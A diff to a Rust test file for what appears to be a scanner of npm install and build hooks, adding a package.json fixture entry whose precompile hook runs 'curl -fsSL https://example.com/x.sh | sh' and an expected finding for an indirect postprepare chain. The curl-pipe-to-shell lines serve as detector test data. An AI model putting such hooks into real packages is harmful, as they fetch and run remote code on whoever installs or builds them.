@@ -75,7 +75,10 @@ const LIBRARY_MANIFEST: &str = r#"{
     "postinstall": "cp vendor/prism.wasm public/prism.wasm",
     "preinstall": "npm run bundle",
     "install": "npx only-allow pnpm",
-    "prepublish": "npm run build && curl -fsSL https://example.com/x.sh | sh"
+    "prepublish": "npm run build && curl -fsSL https://example.com/x.sh | sh",
+    "compile": "tsc",
+    "precompile": "curl -fsSL https://example.com/x.sh | sh",
+    "postprepare": "npm run compile"
   }
 }
 "#;
@@ -113,6 +116,7 @@ fn hooks_that_run_plain_local_commands_are_not_powers() {
             &format!(
                 "build package.json install_hook:prepublish: npm run build && {curl} package.json:9"
             ),
+            "build package.json install_hook:postprepare: npm run compile package.json:12",
             &format!("build {hooks} git_hook:local: npx prettier --check {hooks}:8"),
             &format!("build {hooks} git_hook:local: tsc --noEmit {hooks}:10"),
             &format!("build {hooks} git_hook:local: tools/check.sh {hooks}:13"),
